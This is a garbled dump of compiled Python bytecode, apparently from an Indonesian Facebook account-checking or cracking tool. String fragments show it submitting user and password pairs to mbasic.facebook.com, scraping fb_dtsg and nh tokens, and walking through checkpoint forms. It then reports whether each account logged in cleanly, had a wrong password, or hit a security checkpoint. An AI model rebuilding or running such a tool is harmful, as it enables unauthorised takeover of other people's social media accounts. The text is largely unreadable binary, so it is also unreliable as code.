    Akun OK tidak terkena sesi♥r?   r0  r1  r2  rt   ?action?name="fb_dtsg" value="(.*?)"rP   ?	Lanjutkan?name="nh" value="(.*?)"?Zfb_dtsgr?   Zcheckpoint_datazsubmit[Continue]Znh?https://mbasic.facebook.com/%s?optionr   z    %sTidak ada opsi ngab !z     z     Pewek salah !)r   r?   r   rg   rh   r   r   ri   rt   r   r  r   r7  r8  r9  rF   r   r   )r?   r  r  r  r+  ?_data_r  ?_html_?_date_?_opsi_?_ke2_?_cek_?_sih_?pramr   r   r   r      sB   ?
j L
?r   c                 C   s?  z?t ?? }dddddddddd	d
d?}|?d?}t?dt|j???d?t?dt|j???d?t?dt|j???d?t?dt|j???d?dd| |ddd?
}|jd|d?}d|j	?
? v rbtd? W d S d|j	?
? v r?t|jd?}|?dddi?d }t?dt|j???d?t?dt|j???d?dd t?d!t|j???d?d"?}	|jd#| |	d?}
t|
jd?}|?d$?}t|?d%kr?td&? W d S |D ]}td? td't|? ? td(|j ? t?d? q?W d S td)? W d S  ty? } zt|? W Y d }~d S d }~ww )*Nr  rR   r?   r?   r  r?   r?   r?   r?   rS   r:  r#  r?   r	   r?   r$  r%  r?   r&  r'  r*  r?   u#   
 ✓ Akun OK tidak terkena sesi♥r?   r0  r1  r2  rt   r;  r<  rP   r=  r>  r?  r@  rA  r   u   
 ✓ Tidak ada opsi ngab !z -> Terdapat %s opsi ngab !z -> u   
 ×  Pewek salah !)r   r?   r   rg   rh   r   r   ri   rt   r   r  r   r7  r8  r9  rF   r   r   r   r?   )r(  Zuserxr  r  r+  rB  r  rC  rD  rE  rF  rG  rH  rI  ?ur   r   r   r
   $  sF   ?
j L
?$? r
   ?__main__)]r   rg   r   Zbs4rz   r   ?
subprocessr   r   ?calendarr?   ?platformZrichZrich.progressr   r   Zconcurrent.futuresr   r?   r   r7  ?ModuleNotFoundErrorr  r   r   ?ImportErrorr   r   Z
concurrent?	threading?	itertools?base64ZAzimVaur   ?now?ct?month?nZbulanZnTemp?
ValueError?onr5  Zbulan_?current?dayZhari?yearZtahunZbullanr@   Z_chekpoint_r   r   r?   rj   rk   rC   r?   rB   ?Br;   r?   r?   rA   r>   r   rG   rH   r?   r?   r?   r?   rs   r?   Zproxiezr   rD   rI   rM   rf   rl   ru   r}   r?   r?   r?   r?   r?   r  r   r
   r-  r   r   r   r   ?<module>   s?   80&? ???h
?
?
	<


   )$
(
?